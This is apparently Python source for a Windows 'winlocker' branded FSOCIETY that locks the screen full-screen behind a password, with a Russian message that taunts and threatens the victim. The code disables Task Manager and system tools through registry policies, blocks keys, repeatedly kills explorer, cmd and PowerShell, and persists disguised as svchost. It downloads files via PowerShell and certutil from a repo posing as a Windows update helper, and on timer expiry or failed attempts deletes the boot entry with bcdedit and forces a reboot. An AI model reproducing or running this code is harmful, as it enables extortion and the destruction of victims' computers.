# ============================================================
# FSOCIETY WINLOCKER v7.0 — АБСОЛЮТНАЯ БЛОКИРОВКА
# ============================================================
import subprocess, sys, os, time, threading, tempfile, ctypes, winreg, urllib

for lib, name in [("cv2", "opencv-python"), ("pygame", "pygame"), ("keyboard", "keyboard"), ("numpy", "numpy")]:
    try: __import__(lib)
    except: subprocess.check_call([sys.executable, "-m", "pip", "install", name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

import cv2, pygame, keyboard, numpy as np
import tkinter as tk

# СКРЫВАЕМ КОНСОЛЬ СРАЗУ
try:
    import win32console, win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)
except: pass

PASSWORD = "1601"
MAX_ATTEMPTS = 5
TIMER_MINUTES = 60
TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Crypto", "RSA", "timer.dat")
VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/releases/download/v1.0/fuxEcorp.mp4"
MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/releases/download/v1.0/locker_music.mp3"
attempts_left = MAX_ATTEMPTS

# ============================================================
# СКАЧИВАНИЕ
# ============================================================
def download_file(url, path):
    if os.path.exists(path) and os.path.getsize(path) > 1000: return True
    for method in [
        lambda: urllib.request.urlretrieve(url, path),
        lambda: subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW),
        lambda: subprocess.run(['certutil', '-urlcache', '-split', '-f', url, path], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW),
    ]:
        try: method(); 
            if os.path.getsize(path) > 1000: return True
        except: pass
    return False

# ============================================================
# БЛОКИРОВКА ВСЕГО
# ============================================================
def block_all_keys():
    # Реестр — запрет всего
    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for subkey, name, value in [
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", 1),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableLockWorkstation", 1),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableChangePassword", 1),
        ]:
            try:
                k = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, value)
                winreg.CloseKey(k)
            except: pass
    
    # Блокировка клавиш
    for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete','win','lwin','rwin','apps','menu']:
        try: keyboard.block_key(k)
        except: pass
    
    # Блокировка ВСЕХ комбинаций
    for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','ctrl+x','ctrl+z','ctrl+a','ctrl+p','ctrl+s','ctrl+o','ctrl+n','ctrl+t','ctrl+shift+t','ctrl+shift+n','win+d','win+r','win+e','win+l','win+m','win+x','win+tab','win+ctrl+d','win+ctrl+f4','win+1','win+2','win+3','win+4','win+5','win+6','win+7','win+8','win+9','win+0','win+b','win+i','win+k','win+p','win+q','win+t','win+u','win+w','win+home','win+space','win+enter','win+left','win+right','win+up','win+down','win+shift+m','win+shift+s','win+period','win+comma']:
        try: keyboard.add_hotkey(c, lambda: None, suppress=True)
        except: pass
    
    # Блокируем мышь кроме кликов
    try: ctypes.windll.user32.BlockInput(True); time.sleep(0.1); ctypes.windll.user32.BlockInput(False)
    except: pass

def kill_taskbar():
    while True:
        try:
            os.system("taskkill /f /im explorer.exe >nul 2>&1")
            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
            os.system("taskkill /f /im cmd.exe >nul 2>&1")
            os.system("taskkill /f /im powershell.exe >nul 2>&1")
            os.system("taskkill /f /im regedit.exe >nul 2>&1")
            os.system("taskkill /f /im msconfig.exe >nul 2>&1")
        except: pass
        time.sleep(0.05)

def destroy_windows():
    os.system("bcdedit /delete {current} /f >nul 2>&1")
    os.system("shutdown /r /t 0 /f")
    os._exit(0)

def get_timer():
    try:
        if os.path.exists(TIMER_FILE):
            with open(TIMER_FILE) as f: return float(f.read())
    except: pass
    end = time.time() + TIMER_MINUTES*60
    os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
    with open(TIMER_FILE, 'w') as f: f.write(str(end))
    return end

def timer_check():
    while True:
        try:
            if get_timer() - time.time() <= 0: destroy_windows()
        except: pass
        time.sleep(5)

def add_startup():
    try:
        src = os.path.abspath(sys.argv[0])
        dst = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup\svchost.pyw')
        with open(src) as f: open(dst,'w').write(f.read())
    except: pass
    try:
        for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
            k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe","pythonw.exe")}" "{os.path.abspath(sys.argv[0])}"')
            winreg.CloseKey(k)
    except: pass
    os.system("bcdedit /deletevalue {current} safeboot >nul 2>&1")

def anim_fsociety():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True); a.protocol("WM_DELETE_WINDOW", lambda: None)
    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold')); lbl.pack(expand=True)
    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
        lbl.config(text=t); a.update(); time.sleep(0.3)
    time.sleep(1)
    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20)); sub.pack(pady=20)
    for i in range(len("ТЕБЯ ВИДИТ")+1): sub.config(text="ТЕБЯ ВИДИТ"[:i]); a.update(); time.sleep(0.1)
    time.sleep(2); a.destroy()

def play_video():
    video_path = os.path.join(tempfile.gettempdir(), "fv.mp4")
    if not download_file(VIDEO_URL, video_path): return
    try:
        pygame.mixer.init(); pygame.mixer.music.load(video_path); pygame.mixer.music.play()
    except: pass
    try:
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened(): return
        fps = cap.get(cv2.CAP_PROP_FPS) or 30
        cv2.namedWindow("FSOCIETY", cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("FSOCIETY", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        # Убираем рамку окна через WinAPI
        hwnd = ctypes.windll.user32.FindWindowW(None, "FSOCIETY")
        if hwnd:
            style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
            style &= ~0x00C00000  # Убираем заголовок
            style &= ~0x00040000  # Убираем возможность закрытия
            ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)
            ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 3)
        while cap.isOpened():
            ret, frame = cap.read()
            if not ret: break
            cv2.imshow("FSOCIETY", frame)
            if cv2.waitKey(int(1000/fps)) & 0xFF == 27: pass  # Игнорируем Esc
        cap.release(); cv2.destroyAllWindows()
        for _ in range(10): cv2.waitKey(1)
    except: pass
    try: pygame.mixer.music.stop()
    except: pass

class WinLocker:
    def __init__(self):
        global attempts_left
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='black'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        for key in ["<Alt-F4>", "<Escape>", "<Win_L>", "<Win_R>", "<Control-Alt-Delete>"]:
            self.win.bind(key, lambda e: None)
        self.win.focus_force()
        
        self.timer_end = get_timer()
        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
        self.timer_label.place(relx=0.5, rely=0.08, anchor='center')
        self.update_timer()
        
        try:
            music_path = os.path.join(tempfile.gettempdir(), "lm.mp3")
            download_file(MUSIC_URL, music_path)
            if os.path.exists(music_path) and os.path.getsize(music_path) > 1000:
                pygame.mixer.init(); pygame.mixer.music.load(music_path); pygame.mixer.music.set_volume(1.0); pygame.mixer.music.play(-1)
        except: pass
        
        msg = f"""Вот чего доводит интернет.

Вот смотри, ты скачивал игры или что там из интернета?
Вот доскачался. Сиди и жуй мой винлокер.

FSOCIETY тебя приветствует!

Смотри, ты хочешь перезагрузить ПК? У тебя не получится.
ПК перезагрузить получится, но избавиться от меня - нет.
Я везде. Я в твоём роутере.
Я знаю все твои данные.
У меня есть cookies файлы, пароли, логины, почты и т.д.

МЫ FSOCIETY.
YOU FUCK.

ПОПЫТОК: {MAX_ATTEMPTS}"""
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier', 10, 'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier', 14, 'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier', 12, 'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def update_timer(self):
        remaining = self.timer_end - time.time()
        if remaining <= 0: destroy_windows()
        h, m, s = int(remaining//3600), int((remaining%3600)//60), int(remaining%60)
        self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.win.after(1000, self.update_timer)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            try: pygame.mixer.music.stop()
            except: pass
            for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                for subkey, name in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
                    try: k=winreg.OpenKey(hkey,subkey,0,winreg.KEY_SET_VALUE); winreg.SetValueEx(k,name,0,winreg.REG_DWORD,0); winreg.CloseKey(k)
                    except: pass
            try: keyboard.unhook_all()
            except: pass
            try: os.remove(TIMER_FILE)
            except: pass
            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
            time.sleep(1); self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else:
                try: pygame.mixer.music.stop()
                except: pass
                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
                time.sleep(2); destroy_windows()
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    threading.Thread(target=kill_taskbar, daemon=True).start()
    threading.Thread(target=timer_check, daemon=True).start()
    add_startup()
    anim_fsociety()
    play_video()
    block_all_keys()
    WinLocker()
    tk.mainloop()
